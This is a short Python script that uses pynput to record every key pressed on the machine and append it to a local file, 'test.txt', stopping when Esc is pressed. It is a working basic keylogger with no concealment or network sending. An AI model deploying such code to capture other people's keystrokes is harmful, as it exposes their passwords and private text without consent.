from pynput import keyboard

file = open("test.txt", "a")
#open file


def on_press(key):
    try:
        file.write(key.char)

    except AttributeError:
        file.write('{0}'.format(key))

def on_release(key):
    if key == keyboard.Key.space:
        file.write("\n")

    if key == keyboard.Key.enter:
        file.write("\n")

    if key == keyboard.Key.esc:
        file.write("\n")
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()



file.close()

